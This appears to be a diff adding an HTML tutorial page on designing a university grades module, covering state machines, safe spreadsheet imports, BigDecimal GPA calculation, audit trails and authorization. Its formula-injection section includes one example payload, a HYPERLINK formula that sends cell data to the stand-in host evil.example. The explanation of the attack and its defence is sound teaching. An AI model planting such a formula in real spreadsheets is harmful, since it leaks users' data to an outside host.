@@ -1,0 +1,519 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Grades and Audit Lesson</title>
+<meta name="description" content="Smart Campus lesson 23: a grade state machine, safe spreadsheet imports, GPA with BigDecimal, review requests, an append-only audit trail and grade events.">
+<link rel="stylesheet" href="assets/lesson.css">
+<script src="assets/lesson.js"></script>
+</head>
+<body data-lesson="23">
+
+<header class="topbar">
+  <a href="index.html">← Smart Campus lessons</a>
+  <span class="spacer"></span>
+  <button id="theme-btn" type="button">Theme</button>
+</header>
+
+<main>
+<div class="eyebrow">Lesson 23 · Part 2: Feature modules</div>
+<h1>Grades: audit trails, locking, imports</h1>
+<p class="lede">Grades are the most sensitive data in Smart Campus. A wrong number can cost a
+student a scholarship. So grades follow strict steps (draft, published, locked), every change is
+recorded forever, spreadsheet uploads are checked row by row, and GPA is calculated with exact
+decimal numbers.</p>
+
+<div class="meta">
+  <span class="badge module">grade</span>
+  <span class="badge task">GR-1</span>
+  <span class="badge task">GR-2</span>
+  <span class="badge task">GR-3</span>
+  <span class="badge task">GR-5</span>
+  <span class="badge task">GR-6</span>
+  <span class="badge task">GR-7</span>
+  <span class="badge task">NFR-3</span>
+  <span class="badge time">~80 min</span>
+  <span class="badge level">Core idea</span>
+</div>
+
+<div class="callout">
+  <span class="title">Before this lesson</span>
+  Read <a href="17-spring-security.html">17 (roles and <code>@PreAuthorize</code>)</a>,
+  <a href="19-domain-modeling.html">19 (aggregates and invariants)</a> and
+  <a href="22-read-models-cqrs.html">22 (local projections)</a>.
+</div>
+
+<div class="callout warn">
+  <span class="title">Planned, not built yet</span>
+  <code>grade</code> is module 7 and has no spec yet. Tables, states, endpoints and the grading
+  scale below are <strong>proposals</strong>. The university's real grading rules must be written
+  down in <code>SPEC-grade.md</code> before any code.
+</div>
+
+<nav class="toc">
+  <strong>In this lesson</strong>
+  <ol>
+    <li><a href="#why">Why you need this</a></li>
+    <li><a href="#states">A state machine for grades</a></li>
+    <li><a href="#entry">Entry by form and by spreadsheet</a></li>
+    <li><a href="#import-risks">Import risks: zip bombs and formulas</a></li>
+    <li><a href="#gpa">GPA with BigDecimal</a></li>
+    <li><a href="#reviews">Review requests</a></li>
+    <li><a href="#audit">An append-only audit trail</a></li>
+    <li><a href="#events-auth">Events, notifications and who may do what</a></li>
+    <li><a href="#in-project">Where it is in Smart Campus</a></li>
+    <li><a href="#mistakes">Common mistakes</a></li>
+    <li><a href="#practice">Practice</a></li>
+    <li><a href="#words">Words to know</a></li>
+    <li><a href="#quiz">Test yourself</a></li>
+    <li><a href="#more">Learn more</a></li>
+  </ol>
+</nav>
+
+<h2 id="why">1. Why you need this in Smart Campus</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Story</th><th>Who</th><th>Wants to…</th><th>Priority</th></tr></thead>
+<tbody>
+<tr><td>GR-1</td><td>Lecturer</td><td>enter grades by form or spreadsheet upload</td><td>Must</td></tr>
+<tr><td>GR-2</td><td>Lecturer</td><td>publish grades for a section, so students see them at once</td><td>Must</td></tr>
+<tr><td>GR-3</td><td>Student</td><td>see grades and GPA per semester</td><td>Must</td></tr>
+<tr><td>GR-4</td><td>Student</td><td>be notified when a grade is published (built by <code>notification</code>)</td><td>Should</td></tr>
+<tr><td>GR-5</td><td>Student</td><td>request a grade review</td><td>Could</td></tr>
+<tr><td>GR-6</td><td>Lecturer</td><td>accept or reject review requests</td><td>Could</td></tr>
+<tr><td>GR-7</td><td>Academic admin</td><td>lock grades after the deadline, "so records can't change without an audit trail"</td><td>Should</td></tr>
+<tr><td>NFR-3</td><td>Academic admin</td><td>an audit log of grade and enrollment changes, "so every change can be traced"</td><td>Must</td></tr>
+</tbody></table></div>
+<p>The Plan's table is <code>grades(id, enrollment_id FK UNIQUE, midterm, final, total, letter,
+published, published_at)</code>. Conflict <strong>C4</strong> points out that
+<code>enrollment_id</code> would be a foreign key into <code>registration</code>, which is
+another schema <em>and</em> another app. So <code>grade</code> stores
+<code>student_id</code> + <code>section_id</code> as plain UUIDs, and keeps its own small
+<strong>roster projection</strong> built from <code>registration.events</code> (who is enrolled
+in which section), like <code>timetable</code> does (lesson 22).</p>
+
+<h2 id="states">2. A state machine for grades</h2>
+<p>The Plan has a <code>published</code> boolean. Together with locking (GR-7) we really have
+three states. A <strong>state machine</strong> lists the states and the only allowed moves
+between them. Think of a parcel: "packed → shipped → delivered". It can never go from
+"delivered" back to "packed".</p>
+<p>Grades are published per section, so the aggregate is a <strong>grade sheet</strong>: one per
+section, with one entry per enrolled student.</p>
+<pre class="diagram">             publish (lecturer, GR-2)          lock (admin or deadline job, GR-7)
+   DRAFT ─────────────────────────────► PUBLISHED ─────────────────────────────► LOCKED
+   │  ▲                                    │  ▲
+   │  │ edit scores freely                 │  │ change a score only through an
+   └──┘ (students see nothing)             └──┘ accepted review (GR-6), audited
+
+   Not allowed: PUBLISHED → DRAFT, LOCKED → anything, DRAFT → LOCKED</pre>
+<pre data-file="Planned: backend/core-app/.../grade/internal/SheetStatus.java"><code>enum SheetStatus {
+    DRAFT, PUBLISHED, LOCKED;
+
+    boolean canMoveTo(SheetStatus next) {
+        return switch (this) {
+            case DRAFT -&gt; next == PUBLISHED;
+            case PUBLISHED -&gt; next == LOCKED;
+            case LOCKED -&gt; false;
+        };
+    }
+}</code></pre>
+<pre data-file="Planned: part of the GradeSheet aggregate"><code>List&lt;GradePublished&gt; publish(UUID actorId, Instant now) {
+    moveTo(SheetStatus.PUBLISHED);
+    if (entries.stream().anyMatch(e -&gt; e.total() == null)) {
+        throw new CampusProblem(ProblemCode.VALIDATION_FAILED, "Every student needs a total before publishing");
+    }
+    this.publishedAt = now;
+    return entries.stream().map(e -&gt; new GradePublished(e.studentId(), sectionId, now)).toList();
+}
+
+private void moveTo(SheetStatus next) {
+    if (!status.canMoveTo(next)) {
+        throw new CampusProblem(ProblemCode.CONFLICT,
+                "Grades for this section are %s and cannot become %s".formatted(status, next));
+    }
+    this.status = next;
+}</code></pre>
+<p>Why <strong>throw</strong> on an illegal move instead of quietly ignoring it? A silent "no"
+hides bugs. If some code tries to unpublish grades, we want a loud error (409 problem JSON) and
+a log line, not a grade sheet that is secretly in a different state than the caller thinks.
+The <code>switch</code> on an enum also forces you to handle every state: add a fourth state
+and the compiler reminds you to decide its moves.</p>
+
+<h2 id="entry">3. Entry by form and by spreadsheet (GR-1)</h2>
+<p>The form is simple: one row per student on the roster, the lecturer types the scores, the
+browser sends them, and the aggregate checks each value (for example 0 ≤ score ≤ 10, at most 2
+decimals) while the sheet is in <code>DRAFT</code>.</p>
+<p>For a class of 200, lecturers prefer a spreadsheet. The import must be <strong>strict and
+helpful at the same time</strong>:</p>
+<ol>
+  <li><strong>Parse everything first.</strong> Read all rows into simple records. Do not save
+      anything yet.</li>
+  <li><strong>Validate every row</strong> and collect <em>all</em> errors, not only the first:
+      unknown student code (not on the roster), score out of range, too many decimals, the same
+      student twice, missing columns.</li>
+  <li><strong>All or nothing.</strong> If there is any error, save nothing and return the full
+      list. If there are none, save all rows in <strong>one transaction</strong>. Half an import
+      is the worst result: nobody knows which rows went in.</li>
+  <li><strong>Preview.</strong> A "dry run" mode returns what would change ("12 new scores,
+      3 changed, 0 errors") so the lecturer can confirm.</li>
+</ol>
+<pre data-file="Planned: the error answer (problem JSON, lesson 09, with an extra list)"><code>HTTP/1.1 400 Bad Request
+Content-Type: application/problem+json
+
+{
+  "type": "https://campus.edu/problems/validation-failed",
+  "title": "Validation failed",
+  "status": 400,
+  "detail": "3 rows have errors. Nothing was saved.",
+  "code": "VALIDATION_FAILED",
+  "traceId": "4bf92f…",
+  "errors": [
+    { "row": 7,  "column": "final",       "message": "11.5 is above the maximum 10" },
+    { "row": 12, "column": "studentCode", "message": "2252xxxx is not enrolled in this section" },
+    { "row": 40, "column": "studentCode", "message": "Duplicate of row 18" }
+  ]
+}</code></pre>
+<p>Row numbers must match what the lecturer sees in Excel (count the header row!), or the
+error list is useless.</p>
+<h3>CSV or Excel?</h3>
+<ul>
+  <li><strong>CSV</strong> is plain text. Watch the encoding: Excel often saves CSV with a
+      byte-order mark (BOM) or in a Windows code page, and Vietnamese names break. Accept
+      UTF-8 (with or without BOM) and say so in the template.</li>
+  <li><strong>Excel (.xlsx)</strong> needs a parser library such as Apache POI. That is a new
+      dependency, and the platform spec says to ask first. Offer a downloadable template with
+      the roster already filled in, so lecturers only add scores.</li>
+</ul>
+
+<h2 id="import-risks">4. Import risks: zip bombs and formula injection</h2>
+<p>An uploaded file is <strong>untrusted input</strong>, even from a lecturer: their computer
+may be infected, or the file may come from somewhere else.</p>
+<h3>Zip bombs</h3>
+<p>An <code>.xlsx</code> file is really a ZIP archive of XML files. A <strong>zip bomb</strong>
+is a tiny file (a few KB) that expands to gigabytes when unpacked, and fills the server's
+memory. Defences:</p>
+<ul>
+  <li>Limit the upload size (a grade sheet is small; something like 2 MB is plenty) in Spring's
+      multipart settings and at the gateway.</li>
+  <li>Limit the number of rows (no section has 100,000 students).</li>
+  <li>Use the parser's own protections. Apache POI, for example, refuses entries that compress
+      "too well" (<code>ZipSecureFile</code> and its minimum inflate ratio). Do not turn these
+      off.</li>
+  <li>Check the file type by its content, not only by the file name.</li>
+</ul>
+<h3>CSV formula injection</h3>
+<p>If a cell starts with <code>=</code>, <code>+</code>, <code>-</code> or <code>@</code>,
+spreadsheet programs treat it as a <strong>formula</strong>. Imagine a student whose "name" in
+some system is <code>=HYPERLINK("http://evil.example/?"&amp;A1,"click")</code>. When the
+lecturer later <em>exports</em> grades to CSV and opens it in Excel, the formula runs on the
+lecturer's computer.</p>
+<ul>
+  <li><strong>On import:</strong> scores are numbers, so reject anything that is not a plain
+      number. Text columns we only use for matching (student code) must match the roster exactly.</li>
+  <li><strong>On export:</strong> if a text cell starts with <code>=</code>, <code>+</code>,
+      <code>-</code>, <code>@</code>, a tab or a carriage return, put a single quote
+      <code>'</code> in front so Excel shows it as text.</li>
+</ul>
+<p>More on uploads in <a href="28-file-storage-s3.html">lesson 28</a> and
+<a href="30-security-hardening.html">lesson 30</a>.</p>
+
+<h2 id="gpa">5. GPA with BigDecimal (GR-3)</h2>
+<p>Never use <code>double</code> for grades or money. <code>double</code> stores binary
+fractions, so <code>0.1 + 0.2</code> is <code>0.30000000000000004</code>. A GPA of
+<code>2.4999999</code> rounded down to 2.49 instead of 2.50 can decide a scholarship.
+<code>BigDecimal</code> stores exact decimal numbers, like the shared-kernel's
+<code>Money</code> does.</p>
+<h3>Example scale (for teaching only)</h3>
+<p>Many Vietnamese universities using credits convert the 10-point score to a letter and a
+4-point value like this. <strong>This is an example.</strong> Your university's real table,
+rounding steps and retake rules must be fixed in <code>SPEC-grade.md</code>.</p>
+<div class="table-wrap"><table>
+<thead><tr><th>10-point score</th><th>Letter</th><th>4-point value</th></tr></thead>
+<tbody>
+<tr><td>8.5 – 10.0</td><td>A</td><td>4.0</td></tr>
+<tr><td>8.0 – 8.4</td><td>B+</td><td>3.5</td></tr>
+<tr><td>7.0 – 7.9</td><td>B</td><td>3.0</td></tr>
+<tr><td>6.5 – 6.9</td><td>C+</td><td>2.5</td></tr>
+<tr><td>5.5 – 6.4</td><td>C</td><td>2.0</td></tr>
+<tr><td>5.0 – 5.4</td><td>D+</td><td>1.5</td></tr>
+<tr><td>4.0 – 4.9</td><td>D</td><td>1.0</td></tr>
+<tr><td>below 4.0</td><td>F</td><td>0.0</td></tr>
+</tbody></table></div>
+<h3>The calculation</h3>
+<p>GPA is a <strong>weighted average</strong>: each course counts as many times as it has
+credits. A 4-credit course matters twice as much as a 2-credit course.</p>
+<pre class="diagram">GPA = Σ (4-point value × credits) ÷ Σ credits
+
+CS101  8.7 → A  4.0 × 3 credits = 12.0
+MA101  7.2 → B  3.0 × 4 credits = 12.0
+EN101  6.0 → C  2.0 × 2 credits =  4.0
+                          sum     28.0 ÷ 9 credits = 3.111… → 3.11</pre>
+<pre data-file="Planned: backend/core-app/.../grade/internal/GpaCalculator.java"><code>record CourseResult(BigDecimal total10, int credits) { }
+
+final class GpaCalculator {
+    private final GradeScale scale;                       <span class="c">// the table above, from config/spec</span>
+
+    GpaCalculator(GradeScale scale) {
+        this.scale = scale;
+    }
+
+    Optional&lt;BigDecimal&gt; gpa(List&lt;CourseResult&gt; results) {
+        BigDecimal points = BigDecimal.ZERO;
+        int credits = 0;
+        for (CourseResult r : results) {
+            BigDecimal point4 = scale.toPoint4(r.total10().setScale(1, RoundingMode.HALF_UP)); <span class="c">// rule: round total first</span>
+            points = points.add(point4.multiply(BigDecimal.valueOf(r.credits())));
+            credits += r.credits();
+        }
+        if (credits == 0) {
+            return Optional.empty();                      <span class="c">// no GPA yet, not "0.00"</span>
+        }
+        return Optional.of(points.divide(BigDecimal.valueOf(credits), 2, RoundingMode.HALF_UP));
+    }
+}</code></pre>
+<ul>
+  <li><strong>Create from strings</strong>: <code>new BigDecimal("8.45")</code>, never
+      <code>new BigDecimal(8.45)</code> (that copies the binary error in).</li>
+  <li><strong>Always give a scale and a <code>RoundingMode</code> to <code>divide</code></strong>.
+      Without them, 28 ÷ 9 throws <code>ArithmeticException</code>, because the exact answer
+      never ends.</li>
+  <li><strong>Round on purpose, at fixed steps</strong>: the total to 1 decimal before the
+      letter, the GPA to 2 decimals at the end. Write each step in the spec.</li>
+  <li><strong>Compare with <code>compareTo</code></strong>, not <code>equals</code>:
+      <code>new BigDecimal("8.5").equals(new BigDecimal("8.50"))</code> is <code>false</code>.</li>
+  <li>Store scores as <code>NUMERIC(4,2)</code> in PostgreSQL, which is exact too.</li>
+</ul>
+
+<h2 id="reviews">6. Review requests (GR-5, GR-6)</h2>
+<p>A student thinks the final exam was marked wrong. They open a <strong>review request</strong>;
+the lecturer accepts (and corrects the score) or rejects it with a reason.</p>
+<pre data-file="Planned migration (grade schema)"><code>CREATE TABLE grade.review_requests (
+    id              UUID PRIMARY KEY,
+    grade_sheet_id  UUID NOT NULL REFERENCES grade.grade_sheets (id),   <span class="c">-- same schema</span>
+    student_id      UUID NOT NULL,
+    reason          TEXT NOT NULL,
+    status          TEXT NOT NULL,          <span class="c">-- OPEN / ACCEPTED / REJECTED</span>
+    decided_by      UUID,
+    decision_note   TEXT,
+    created_at      TIMESTAMPTZ NOT NULL,
+    decided_at      TIMESTAMPTZ,
+    version         BIGINT NOT NULL DEFAULT 0
+);
+<span class="c">-- At most one open request per student per sheet</span>
+CREATE UNIQUE INDEX one_open_review
+    ON grade.review_requests (grade_sheet_id, student_id) WHERE status = 'OPEN';</code></pre>
+<p>Rules to put in the model (proposed): a request is only possible while the sheet is
+<code>PUBLISHED</code> and before the review deadline; only the student themself can open it;
+only the section's lecturer can decide; accepting it is the <em>only</em> way to change a
+published score, and the change is audited with the review id as the reason. Review requests
+have their own small state machine (<code>OPEN → ACCEPTED</code> or <code>OPEN →
+REJECTED</code>).</p>
+
+<h2 id="audit">7. An append-only audit trail (NFR-3, GR-7)</h2>
+<p>An <strong>audit trail</strong> answers "who changed what, when, from what, to what, and
+why". It is <strong>append-only</strong>: rows are only ever added, never changed or deleted,
+like the pages of a bound notebook.</p>
+<pre data-file="Planned migration (grade schema)"><code>CREATE TABLE grade.grade_audit (
+    id              UUID PRIMARY KEY,
+    grade_sheet_id  UUID NOT NULL,
+    student_id      UUID NOT NULL,
+    field           TEXT NOT NULL,          <span class="c">-- midterm / final / total / status</span>
+    old_value       TEXT,
+    new_value       TEXT,
+    actor_id        UUID NOT NULL,          <span class="c">-- who (from the JWT)</span>
+    reason          TEXT,                   <span class="c">-- "import file x.xlsx", "review 7f3…"</span>
+    trace_id        TEXT,                   <span class="c">-- link to logs and traces (lesson 12)</span>
+    occurred_at     TIMESTAMPTZ NOT NULL    <span class="c">-- from Clock</span>
+);</code></pre>
+<h3>App-level vs database trigger</h3>
+<div class="compare">
+  <div class="good"><h4>Written by the application</h4>
+    <p>The aggregate records each change; the service inserts audit rows <strong>in the same
+    transaction</strong> as the change (both saved or neither). It knows the actor, the reason
+    and the trace id. Easy to test with unit tests.</p>
+    <p>Weak point: a developer who writes SQL that skips the aggregate skips the audit.</p></div>
+  <div class="good"><h4>Written by a PostgreSQL trigger</h4>
+    <p>A trigger on <code>grade.grade_entries</code> writes old and new values on every
+    <code>UPDATE</code>, whatever code ran it. Nothing can forget it.</p>
+    <p>Weak point: the database does not know "who" or "why". The app must pass them, for
+    example with <code>SET LOCAL campus.actor_id = '…'</code> in the transaction, which the
+    trigger reads with <code>current_setting('campus.actor_id', true)</code>.</p></div>
+</div>
+<p>A good combination: write audit rows from the application (rich context), and add a small
+trigger that <strong>forbids</strong> <code>UPDATE</code> and <code>DELETE</code> on the audit
+table, so it really is append-only:</p>
+<pre data-file="Planned: protect the audit table"><code>CREATE FUNCTION grade.audit_is_append_only() RETURNS trigger
+LANGUAGE plpgsql AS $$
+BEGIN
+    RAISE EXCEPTION 'grade_audit is append-only';
+END;
+$$;
+
+CREATE TRIGGER no_update_or_delete
+    BEFORE UPDATE OR DELETE ON grade.grade_audit
+    FOR EACH ROW EXECUTE FUNCTION grade.audit_is_append_only();</code></pre>
+<p>Be honest about the limit: the table owner (<code>core_app</code>) could drop the trigger.
+This stops <em>accidents and bugs</em>, not a person with owner rights. Stronger protection
+(a separate audit store, write-once storage) is a production topic.</p>
+<p>Locking (GR-7) works with the audit: once a sheet is <code>LOCKED</code>, the aggregate
+refuses every change. If the university wants a formal correction process after locking (an
+academic admin with a mandatory reason), the spec must add it as an explicit, audited action,
+not a "just unlock it" button.</p>
+
+<h2 id="events-auth">8. Events, notifications and who may do what</h2>
+<h3><code>GradePublished</code> on <code>grade.events</code></h3>
+<p>When a sheet is published, <code>grade</code> publishes one <code>GradePublished</code>
+<strong>per student</strong> through the outbox. The topic <code>grade.events</code> is keyed by
+<strong>studentId</strong> (<code>Topics.GRADE_EVENTS</code>, spec D6), so one student's grade
+events stay in order.</p>
+<pre data-file="Planned payload"><code>public record GradePublished(
+        StudentId studentId,     <span class="c">// the Kafka key for grade.events</span>
+        SectionId sectionId,
+        Instant publishedAt) { } <span class="c">// no score: see below</span></code></pre>
+<p>Why no score in the event? Event topics keep <strong>all history forever</strong>
+(<code>retention.ms=-1</code>, spec D5). A score in an event is a copy of private data that can
+never be deleted from Kafka. The consumer that needs it (<code>notification</code>) only says
+"your CS101 grade is published"; the student opens the app to see the number.</p>
+<h3>Notify on publish (GR-4)</h3>
+<p><code>notification</code> is a "sink" (capability map): it consumes
+<code>GradePublished</code> and sends an in-app message, push or email. The capability map's rule
+is that each publisher's spec includes the notification handler for its own events, so the
+grade spec owns this handler. See <a href="24-realtime-notifications.html">lesson 24</a>.</p>
+<h3>Authorization: only the section's lecturer</h3>
+<p>Having the <code>LECTURER</code> role is not enough: a lecturer may grade <em>only their own
+sections</em> (Arch §8: "a lecturer grades only their sections"). That is a row-level
+<strong>ownership check</strong>. <code>grade</code> learns who teaches a section from
+<code>SectionChanged.lecturerId</code> (a local projection, lesson 22).</p>
+<pre data-file="Planned: role check + ownership check"><code><span class="k">@PreAuthorize</span>("hasRole('LECTURER')")                       <span class="c">// 1. the role (lesson 17)</span>
+<span class="k">@PostMapping</span>("/api/v1/grade/sections/{sectionId}/publication")
+ResponseEntity&lt;Void&gt; publish(<span class="k">@PathVariable</span> UUID sectionId, <span class="k">@AuthenticationPrincipal</span> Jwt jwt) {
+    UUID me = currentUsers.idOf(jwt);
+    if (!sectionLecturers.isLecturerOf(me, new SectionId(sectionId))) {  <span class="c">// 2. the ownership</span>
+        throw new CampusProblem(ProblemCode.NOT_FOUND, "Section %s not found".formatted(sectionId));
+    }
+    gradeSheets.publish(new SectionId(sectionId), me);
+    return ResponseEntity.noContent().build();
+}</code></pre>
+<ul>
+  <li>Answering <strong>404</strong> instead of 403 for someone else's section avoids telling
+      strangers which sections exist. The spec chooses one and uses it everywhere.</li>
+  <li>Students read <strong>only their own</strong> grades: the student id comes from the
+      token, never from a request parameter.</li>
+  <li>Locking (GR-7) is for <code>ACADEMIC_ADMIN</code> (role list from C3), plus a scheduled
+      job at the deadline.</li>
+</ul>
+
+<h2 id="in-project">9. Where it is in Smart Campus</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Idea</th><th>Where</th><th>Status</th></tr></thead>
+<tbody>
+<tr><td><code>grade</code> schema</td><td><code>infra/postgres/init/01-schemas-and-users.sh</code></td><td>exists, empty</td></tr>
+<tr><td><code>grade.events</code> key studentId</td><td><code>backend/shared-kernel/.../kernel/event/Topics.java</code> (<code>GRADE_EVENTS</code>)</td><td>exists (T5)</td></tr>
+<tr><td>Problem codes, problem JSON</td><td><code>ProblemCode.java</code>, <code>platform-starter/.../starter/problem/</code></td><td>exists (T5, T8)</td></tr>
+<tr><td>Exact decimals example</td><td><code>backend/shared-kernel/.../kernel/money/Money.java</code></td><td>exists</td></tr>
+<tr><td>Roles (<code>LECTURER</code>, <code>ACADEMIC_ADMIN</code>…)</td><td><code>identity</code> module (C3)</td><td>planned (module 2)</td></tr>
+<tr><td>Grade sheets, import, GPA, reviews, audit</td><td><code>backend/core-app/src/main/java/edu/campus/grade/</code></td><td>planned (module 7)</td></tr>
+<tr><td><code>GradePublished</code> notification handler</td><td><code>notification-service</code>, owned by the grade spec</td><td>planned</td></tr>
+</tbody></table></div>
+
+<h2 id="mistakes">10. Common mistakes</h2>
+<ul>
+  <li><strong>A <code>published</code> boolean plus a <code>locked</code> boolean.</strong> Four
+      combinations, one of them nonsense (locked but not published). Use one status field.</li>
+  <li><strong>Saving the valid rows of an import and skipping the bad ones.</strong> All or
+      nothing.</li>
+  <li><strong>Stopping at the first error.</strong> The lecturer fixes one row, uploads again,
+      finds the next. Report all errors at once.</li>
+  <li><strong><code>double</code> for scores, or <code>divide</code> without a rounding mode.</strong></li>
+  <li><strong>Writing the audit row in a separate transaction</strong>, or after the commit.
+      A crash leaves a change without a trace.</li>
+  <li><strong>Checking only the role</strong>, so any lecturer can grade any section.</li>
+  <li><strong>Putting scores in events</strong> on a topic that keeps data forever.</li>
+  <li><strong>Hard-coding the grade scale</strong> without a spec. Rules differ between
+      universities and change over time.</li>
+</ul>
+
+<h2 id="practice">11. Practice</h2>
+<ol class="steps">
+  <li><p>Try <code>BigDecimal</code> in <code>jshell</code> (comes with the JDK):</p>
+<pre><code>jshell
+new BigDecimal(0.1)
+new BigDecimal("0.1")
+new BigDecimal("28").divide(new BigDecimal("9"))
+new BigDecimal("28").divide(new BigDecimal("9"), 2, java.math.RoundingMode.HALF_UP)
+new BigDecimal("8.5").equals(new BigDecimal("8.50"))
+new BigDecimal("8.5").compareTo(new BigDecimal("8.50"))</code></pre>
+      <p>(<code>java.math.*</code> is imported in jshell by default.)</p></li>
+  <li><p>Write <code>SheetStatus.canMoveTo</code> and a JUnit test that tries all 9 pairs of
+      states. Which 2 pairs are allowed?</p></li>
+  <li><p>Make a CSV with 5 rows: 2 good, one score of 11, one unknown student code, one
+      duplicate. Write down the exact error list your import should return, with row numbers
+      as Excel shows them.</p></li>
+  <li><p>Compute the GPA for: 9.0 (2 credits), 6.7 (3 credits), 4.5 (3 credits) with the
+      example scale. (Answer: (4.0×2 + 2.5×3 + 1.0×3) ÷ 8 = 18.5 ÷ 8 = 2.3125 → 2.31.)</p></li>
+  <li><p>On paper: list every audit row produced when a lecturer imports a file that changes 3
+      final scores, then publishes, then accepts one review that changes a final from 6.0 to
+      6.5.</p></li>
+</ol>
+
+<h2 id="words">12. Words to know</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Word</th><th>Meaning in simple words</th></tr></thead>
+<tbody>
+<tr><td>State machine</td><td>A list of states and the only allowed moves between them.</td></tr>
+<tr><td>Grade sheet</td><td>All grades of one section; the aggregate that is published and locked.</td></tr>
+<tr><td>All-or-nothing</td><td>Either every row is saved or none is (one transaction).</td></tr>
+<tr><td>Dry run</td><td>Check and show the result without saving anything.</td></tr>
+<tr><td>Zip bomb</td><td>A small compressed file that becomes huge when unpacked.</td></tr>
+<tr><td>Formula injection</td><td>Text that a spreadsheet runs as a formula because it starts with <code>=</code>, <code>+</code>, <code>-</code> or <code>@</code>.</td></tr>
+<tr><td>BigDecimal</td><td>Java's exact decimal number type.</td></tr>
+<tr><td>Weighted average</td><td>An average where some items count more (here: by credits).</td></tr>
+<tr><td>Rounding mode</td><td>The rule for rounding, e.g. <code>HALF_UP</code> (2.345 → 2.35).</td></tr>
+<tr><td>Audit trail</td><td>A record of who changed what, when, from what to what, and why.</td></tr>
+<tr><td>Append-only</td><td>You can add rows, never change or delete them.</td></tr>
+<tr><td>Trigger</td><td>Database code that runs automatically on INSERT, UPDATE or DELETE.</td></tr>
+<tr><td>Ownership check</td><td>Checking that this user owns this row, not only that they have a role.</td></tr>
+</tbody></table></div>
+
+<h2 id="quiz">13. Test yourself</h2>
+<div class="quiz">
+  <details><summary>1. Why should an illegal move like PUBLISHED → DRAFT throw an exception instead of being ignored?</summary>
+    <p>Ignoring it hides a bug: the caller believes the change happened. A clear error (409) is
+    logged and shown, so the problem is found and fixed. Grades must never be in a surprising
+    state.</p></details>
+  <details><summary>2. Why must a spreadsheet import be all-or-nothing?</summary>
+    <p>With partial saves, nobody knows which scores are in the system. Fixing the file and
+    uploading again could create duplicates or mix old and new values. One transaction keeps
+    the sheet in a known state.</p></details>
+  <details><summary>3. Why does <code>divide</code> need a scale and a rounding mode?</summary>
+    <p>Some divisions, like 28 ÷ 9, have no exact decimal result. Without telling
+    <code>BigDecimal</code> how many decimals to keep and how to round, it throws an
+    <code>ArithmeticException</code>. Choosing it explicitly also makes the rounding rule
+    visible and testable.</p></details>
+  <details><summary>4. Why is the audit row written in the same transaction as the grade change?</summary>
+    <p>Then both are saved or neither is. A separate transaction could save the change but
+    lose the audit row in a crash, which breaks NFR-3 ("every change can be traced").</p></details>
+  <details><summary>5. Why is <code>hasRole('LECTURER')</code> not enough to publish grades?</summary>
+    <p>It only proves the user is <em>a</em> lecturer. Without an ownership check, any lecturer
+    could publish or change grades of any section. The check "this user teaches this section"
+    is required too.</p></details>
+  <details><summary>6. Why does <code>GradePublished</code> not include the score?</summary>
+    <p>Event topics keep their history forever. A score in an event would be private data that
+    can never be removed from Kafka, and no consumer needs it: the notification only says the
+    grade is available.</p></details>
+</div>
+
+<h2 id="more">14. Learn more</h2>
+<ul>
+  <li><a href="https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/math/BigDecimal.html">Java 21 API: BigDecimal</a> and <a href="https://docs.oracle.com/en/java/javase/21/docs/api/java.base/java/math/RoundingMode.html">RoundingMode</a>.</li>
+  <li><a href="https://owasp.org/www-community/attacks/CSV_Injection">OWASP: CSV Injection</a>: the attack and the escaping rule.</li>
+  <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html">OWASP File Upload Cheat Sheet</a>: size limits, type checks, archives.</li>
+  <li><a href="https://www.postgresql.org/docs/current/plpgsql-trigger.html">PostgreSQL docs: Trigger functions</a> and <a href="https://www.postgresql.org/docs/current/functions-admin.html#FUNCTIONS-ADMIN-SET">current_setting / set_config</a>.</li>
+  <li><a href="https://docs.spring.io/spring-security/reference/servlet/authorization/method-security.html">Spring Security reference: Method security</a>: <code>@PreAuthorize</code>.</li>
+  <li><a href="https://www.rfc-editor.org/rfc/rfc9457">RFC 9457: Problem Details for HTTP APIs</a>: the successor of RFC 7807, including extension members like <code>errors</code>.</li>
+</ul>
+
+<div id="lesson-end"></div>
+</main>
+</body>
+</html>
